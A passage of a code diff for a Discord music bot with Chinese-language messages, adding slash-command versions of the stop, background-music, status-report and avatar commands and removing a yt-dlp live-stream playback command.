+async def stop_music_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    if interaction.guild.voice_client:
+        interaction.guild.voice_client.stop()
+        await interaction.response.send_message("⏹️ 已停止播放")
+        await asyncio.sleep(1)
+        bot.loop.create_task(play_bgm(interaction))
+    else:
+        await interaction.response.send_message("❌", ephemeral=True)
 
 @bot.command(name="background_music")
 async def background_music(ctx, mode: str):
@@ -694,6 +1208,23 @@ async def background_music(ctx, mode: str):
             ctx.voice_client.stop()
         await ctx.send("❌ 背景音樂模式已關閉。")
 
+@bot.tree.command(name="background_music", description="background_music")
+@app_commands.describe(mode="mode")
+async def background_music_slash(interaction: discord.Interaction, mode: str):
+    global bgm_enabled, is_switching
+    if interaction.user.id not in ALLOWED_IDS: return
+    if mode.lower() == "on":
+        bgm_enabled = True
+        is_switching = False
+        await interaction.response.send_message("✅ 背景音樂模式已開啟。")
+        if interaction.guild.voice_client and not interaction.guild.voice_client.is_playing():
+            await play_bgm(interaction)
+    elif mode.lower() == "off":
+        bgm_enabled = False
+        if interaction.guild.voice_client:
+            interaction.guild.voice_client.stop()
+        await interaction.response.send_message("❌ 背景音樂模式已關閉。")
+        
 @bot.command(name="test")
 async def test(ctx):
     api_latency = round(bot.latency * 1000)
@@ -740,6 +1271,52 @@ async def test(ctx):
     embed.set_footer(text=f"查詢者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
     await ctx.send(embed=embed)
 
+@bot.tree.command(name="test", description="test")
+async def test_slash(interaction: discord.Interaction):
+    api_latency = round(bot.latency * 1000)
+    voice_latency = "未連線"
+    if interaction.guild.voice_client and interaction.guild.voice_client.is_connected():
+        voice_latency = f"{round(interaction.guild.voice_client.latency * 1000)}ms"
+        
+    process = psutil.Process()
+    mem_rss = process.memory_info().rss / 1024 / 1024
+    mem_vms = process.memory_info().vms / 1024 / 1024
+    mem_percent = process.memory_percent()
+    cpu_usage = psutil.cpu_percent()
+    num_threads = process.num_threads()
+    
+    if hasattr(bot, 'start_time'):
+        uptime_seconds = int(time.time() - bot.start_time)
+        days, rem = divmod(uptime_seconds, 86400)
+        hours, rem = divmod(rem, 3600)
+        minutes, seconds = divmod(rem, 60)
+        uptime_str = f"{days}天 {hours}小時 {minutes}分 {seconds}秒"
+    else:
+        uptime_str = "未知 (未設定啟動時間標記)"
+    operator_info = f"{interaction.user.display_name} ({interaction.user.id})"
+    
+    bgm_status = "✅ 運行中" if bgm_enabled else "❌ 已關閉"
+    
+    embed = discord.Embed(title="🛠️ 機器人核心測試報告", color=0x2ecc71, timestamp=interaction.created_at)
+    embed.add_field(name="👤 操作人員名單", value=f"```{operator_info}```", inline=False)
+    embed.add_field(name="⏳ 網路延遲", value=f"**API 延遲:** {api_latency}ms\n**語音閘道:** {voice_latency}", inline=True)
+    embed.add_field(name="💻 系統負載", value=f"**CPU 使用率:** {cpu_usage}%\n**執行線程數:** {num_threads} 個", inline=True)
+    embed.add_field(name="🧠 記憶體狀態", value=f"**實體 (RSS):** {round(mem_rss, 2)} MB\n**虛擬 (VMS):** {round(mem_vms, 2)} MB\n**記憶體佔比:** {round(mem_percent, 2)}%", inline=True)
+    embed.add_field(name="⏱️ 運行統計", value=f"**已連續上線:** {uptime_str}", inline=True)
+    embed.add_field(name="🎵 音樂參數", value=(
+        f"**背景音樂模式:** {bgm_status}\n"
+        f"**FFmpeg 預設:** `veryfast`\n"
+        f"**音訊取樣率:** 48000Hz\n"
+        f"**切歌鎖定:** {'使用中' if is_switching else '空閒'}"
+    ), inline=False)
+    embed.add_field(name="⚙️ 環境資訊", value=(
+        f"**Python:** {platform.python_version()}\n"
+        f"**Discord.py:** {discord.__version__}\n"
+        f"**作業系統:** {platform.system()} {platform.release()}"
+    ), inline=False)
+    embed.set_footer(text=f"查詢者: {interaction.user.display_name}", icon_url=interaction.user.display_avatar.url)
+    await interaction.response.send_message(embed=embed)
+
 @bot.command(name="avatar")
 async def profile(ctx, member: discord.Member = None):
     member = member or ctx.author
@@ -750,56 +1327,16 @@ async def profile(ctx, member: discord.Member = None):
     embed.set_footer(text=f"ID: {member.id}")
     await ctx.send(embed=embed)
 
-@bot.command(name='play_live')
-async def play_live(ctx, *, url: str):
-    if not ctx.author.voice:
-        return await ctx.send("❌ 你必須先加入一個語音頻道！")
-        
-    voice_channel = ctx.author.voice.channel
-    
-    if ctx.voice_client is None:
-        vc = await voice_channel.connect()
-    else:
-        vc = ctx.voice_client
-
-    await ctx.send("🔍 正在解析直播串流，請稍候...")
-
-    ydl_opts = {
-        'format': 'bestaudio/best',
-        'quiet': True,
-        'noplaylist': True,
-        'skip_download': True,
-        'cookiefile': 'youtube.com_cookies.txt',
-        'http_headers': {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        }
-    }
-
-    FFMPEG_LIVE_OPTIONS = {
-        'options': '-vn',
-        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5 -live_start_index -1'
-    }
-
-    loop = asyncio.get_event_loop()
-    try:
-        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            info = await loop.run_in_executor(None, lambda: ydl.extract_info(url, download=False))
-            stream_url = info['url']
-            title = info.get('title', '未知直播')
-    except Exception as e:
-        return await ctx.send(f"❌ 直播解析失敗：{e}")
-
-    if vc.is_playing():
-        vc.stop()
-
-    try:
-        source = discord.FFmpegPCMAudio(stream_url, **FFMPEG_LIVE_OPTIONS)
-        vc.play(source)
-        await ctx.send(f"🔴 **正在現場直播**：{title}")
-    except Exception as e:
-        await ctx.send(f"❌ 播放直播時發生錯誤：{e}")
-
-
+@bot.tree.command(name="avatar", description="avatar")
+@app_commands.describe(member="member")
+async def profile_slash(interaction: discord.Interaction, member: discord.Member = None):
+    member = member or interaction.user
+    embed = discord.Embed(title=f"👤 {member.display_name} 的名片", color=member.color)
+    embed.set_thumbnail(url=member.display_avatar.url)
+    embed.add_field(name="加入伺服器時間", value=member.joined_at.strftime("%Y-%m-%d"), inline=True)
+    embed.add_field(name="最高身份組", value=member.top_role.mention, inline=True)
+    embed.set_footer(text=f"ID: {member.id}")
+    await interaction.response.send_message(embed=embed)
 
 @bot.event
 async def on_message(message):
